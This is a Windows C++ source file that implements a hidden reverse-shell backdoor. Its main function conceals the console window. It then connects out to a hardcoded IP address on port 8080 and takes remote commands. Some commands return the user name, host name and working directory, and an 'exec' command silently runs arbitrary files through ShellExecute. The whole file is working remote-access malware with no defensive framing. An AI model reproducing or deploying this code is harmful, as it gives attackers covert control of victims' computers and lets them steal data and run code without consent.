//C++ Headers

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

//C Header

#include <stdio.h>

//Debug C++ Header

//#include <iostream>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

//cmd exec command WINAPI call

void exec(char* returnval, int returnsize, char *fileexec)
{
    if (32 >= (int)(ShellExecute(NULL,"open", fileexec, NULL, NULL, SW_HIDE))) //Get return value in int
    {
        strcat(returnval, "[x] Error executing command..\n");
    }
    else
    {
        strcat(returnval, "\n");
    }
}

//whoami command WINAPI call

void whoami(char* returnval, int returnsize)
{
    DWORD bufferlen = 257;
    GetUserName(returnval, &bufferlen);
}

//hostname command WINAPI call

void hostname(char* returnval, int returnsize)
{
    DWORD bufferlen = 257;
    GetComputerName(returnval, &bufferlen);
}

//pwd command WINAPI call

void pwd(char* returnval, int returnsize) //Module 2
{
    TCHAR tempvar[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, tempvar);
    strcat(returnval, tempvar);
}

//Reverse shell

void RevShell()
{
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2,2), &wsaver);
    SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("172.105.255.124");
    addr.sin_port = htons(8080);

    if(connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
        //std::cout << "[+] Connected. Hit <Enter> to disconnect..." << std::endl;
        //std::cin.get();
        //std::cout << "[+] Connected to client. Waiting for incoming command..." << std:endl;
        char CommandReceived[DEFAULT_BUFLEN] = "";
        while (true)
        {
            int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
            //std::cout << "Commmand received: " << CommandReceived;
            //std::cout << "Length of Command Receieved: " << Result << std:endl;
            if ((strcmp(CommandReceived, "whoami") == 0)) {
                //std::cout << "Command parsed: whoami" << std::endl;
                char buffer[257] = "";
                whoami(buffer,257);
                strcat(buffer, "\n");
                send(tcpsock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
                //Execute a whoami() function
            }
            else if ((strcmp(CommandReceived, "hostname") == 0)) {
                //std::cout << "Command parsed: whoami" << std::endl;
                char buffer[257] = "";
                hostname(buffer,257);
                strcat(buffer, "\n");
                send(tcpsock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
                //Execute a hostname() function
            }
            else if ((strcmp(CommandReceived, "pwd") == 0)) {
                //std::cout << "Command parsed: pwd" << std::endl;
                char buffer[257] = "";
                pwd(buffer,257);
                strcat(buffer, "\n");
                send(tcpsock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
                //Execute a pwd() function
            }
            else if ((strcmp(CommandReceived, "exit") == 0)) {
                //std::cout << "Command parsed: exit";
                //std::cout << "Closing connection" << std::endl;
                closesocket(tcpsock);
                WSACleanup();
                exit(0);
                //Exit gracefully
            }
            else {
                //std::cout << "Command not parsed!" << std::endl;
                char splitval[DEFAULT_BUFLEN] = "";
                for(int i=0; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
                {
                    if (CommandReceived[i] == *" ")     //CommandReceived[i] is a pointer here and can only be compared with an integer, this *" "
                    {
                        break;
                    }
                    else
                    {
                        splitval[i] = CommandReceived[i];
                    }
                }
                if ((strcmp(splitval, "exec") == 0)) {
                    char CommandExec[DEFAULT_BUFLEN] = "";
                    int j = 0;
                    for(int i=5; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
                    {
                        CommandExec[j] = CommandReceived[i];
                        ++j;
                    }
                    char buffer[257] = "";
                    exec(buffer, 257, CommandExec);
                    strcat(buffer, "\n");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else {
                    char buffer[20] = "Invalid Command\n";
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0 , sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }             
            }
        }

    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}

//Main function

int main()
{
    HWND stealth;           //Declare a window handle
    AllocConsole();         //Allocate a new console
    stealth=FindWindowA("ConsoleWindowClass",NULL);     //Find the previous Window handler and hide/show the window depending on the next command
    ShowWindow(stealth,0);                  //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
    RevShell();
    return 0;
}